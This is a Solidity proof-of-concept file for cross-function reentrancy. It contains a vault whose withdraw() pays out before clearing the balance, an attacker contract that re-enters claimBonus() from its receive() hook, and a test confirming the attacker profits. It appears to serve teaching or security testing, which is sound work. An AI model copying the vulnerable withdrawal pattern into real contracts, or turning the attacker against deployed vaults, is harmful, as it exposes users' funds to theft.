// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract CrossFunctionVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "empty");
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "withdraw failed");
        balances[msg.sender] = 0;
    }

    function claimBonus() external {
        require(balances[msg.sender] > 0, "not eligible");
        (bool success, ) = payable(msg.sender).call{value: 1}("");
        require(success, "bonus failed");
    }

    receive() external payable {}
}

contract CrossFunctionAttacker {
    CrossFunctionVault public vault;
    bool public reentered;

    constructor(CrossFunctionVault target) {
        vault = target;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            vault.claimBonus();
        }
    }
}

contract CrossFunctionReentrancyPoC {
    function testPoC_CrossFunctionCallbackDrainsBonus() external {
        CrossFunctionVault vault = new CrossFunctionVault();
        CrossFunctionAttacker attacker = new CrossFunctionAttacker(vault);
        (bool funded, ) = address(vault).call{value: 1}("");
        require(funded, "vault funding failed");
        (bool attacked, ) = address(attacker).call{value: 1}(
            abi.encodeWithSignature("attack()")
        );
        require(attacked, "attack failed");
        require(address(attacker).balance == 2, "cross-function reentry did not profit");
    }
}
